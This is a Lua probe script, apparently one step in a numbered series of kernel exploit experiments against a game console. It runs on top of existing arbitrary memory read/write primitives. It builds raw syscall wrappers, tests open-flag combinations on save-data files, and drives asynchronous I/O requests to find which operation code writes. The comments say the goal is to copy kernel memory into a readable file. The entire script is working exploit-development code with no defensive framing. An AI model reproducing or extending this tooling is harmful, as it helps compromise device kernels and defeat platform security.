-- CRASH_CLASS: MODERATE
-- PROBE 751a: get a writable file descriptor, and find which op field writes
--
-- 747a opened /savedata0/thread.lua with flags 0 (fd 38) but flags 2 returned
-- -1 in 748a, so no probe has ever held a writable file. The aio descriptor's
-- dword at +0x24 has never been anything but 0, and nobody knows which value
-- means write.
--
-- Why it matters: 750a asks whether a vnode transfer honours kernel addresses.
-- A write op is the read half of that - a buffer pointing into the direct map
-- would copy kernel bytes into a file we can open.
--
-- A: open flags matrix on a scratch path and on thread.lua
-- B: if a writable fd exists, snapshot bytes 0..15, then try op 0..3 with a
--    0x41 fill, re-reading after each to see which one changed the file
-- C: health

print("=== PROBE 751a: AIO WRITABLE FD AND OP ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local sc_open = mk(5)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(U(ts), U(0)) end) end
local function path(s)
    local b = to_num(memory.alloc(#s+1))
    for i=1,#s do memory.write_byte(b+i-1, s:byte(i)) end
    memory.write_byte(b+#s, 0)
    return b
end
print("[A] pid="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))

local targets = {"/savedata0/omp.bin", "/savedata0/thread.lua"}
local flagset = {0, 1, 2, 3, 0x200, 0x201, 0x202, 0x601}
local best = nil
for t=1,#targets do
    for f=1,#flagset do
        local fd = call(sc_open, path(targets[t]), flagset[f], 0, 0, 0, 0)
        print(string.format("[A] open %s flags=%03X -> %s", targets[t], flagset[f], tostring(fd)))
        if type(fd) == "number" and fd > 2 and flagset[f] ~= 0 and best == nil then best = {fd, targets[t], flagset[f]} end
        if type(fd) == "number" and fd > 2 and flagset[f] == 0 and best == nil then best = {fd, targets[t], flagset[f]} end
    end
end

local D = to_num(memory.alloc(0x2000)); local buf = to_num(memory.alloc(0x2000)); local res = to_num(memory.alloc(0x2000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400)); local ds = to_num(memory.alloc(0x400))
zero(D,0x2000); zero(buf,0x2000); zero(res,0x2000); zero(st,0x400); zero(ds,0x400)

local function op_call(fdno, b, op, len)
    zero(D,0x100); zero(res,0x40); zero(st,0x40); zero(ds,0x40)
    wq(D+0x00, uint64(0)); wq(D+0x08, uint64(len))
    wq(D+0x10, uint64(b)); wq(D+0x18, uint64(res))
    wd(D+0x20, fdno); wd(D+0x24, op)
    wd(ids, 0)
    local cr = call(mk(669), 1+0x1000, D, 1, 1, ids, 0)
    local id = rd(ids)
    if id == 0 or id == -1 then return cr, 0 end
    sleep_ms(40)
    wd(ids, id); call(mk(664), ids, 1, st, 0, 0, 0)
    local state = rd(st); local r0 = rd(res)
    wd(ids, id); call(mk(662), ids, 1, ds, 0, 0, 0)
    return state, r0
end

if best then
    print(string.format("[B] using fd=%s path=%s flags=%03X", tostring(best[1]), best[2], best[3]))
    zero(buf,0x40)
    local s0, r0 = op_call(best[1], buf, 0, 16)
    print(string.format("[B] snapshot read state=%s ret=%X buf=%X %X %X %X", tostring(s0), r0, rd(buf), rd(buf+4), rd(buf+8), rd(buf+12)))
    for op=0,3 do
        zero(buf,0x40)
        for k=0,3 do wd(buf+k*4, 0x41414141) end
        local s, r = op_call(best[1], buf, op, 16)
        print(string.format("[B] op=%d state=%s ret=%X", op, tostring(s), r))
        zero(buf,0x40)
        local s2, r2 = op_call(best[1], buf, 0, 16)
        print(string.format("[B]   re-read state=%s ret=%X buf=%X %X %X %X", tostring(s2), r2, rd(buf), rd(buf+4), rd(buf+8), rd(buf+12)))
    end
end
print("[C] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
print("=== 751a DONE ===")
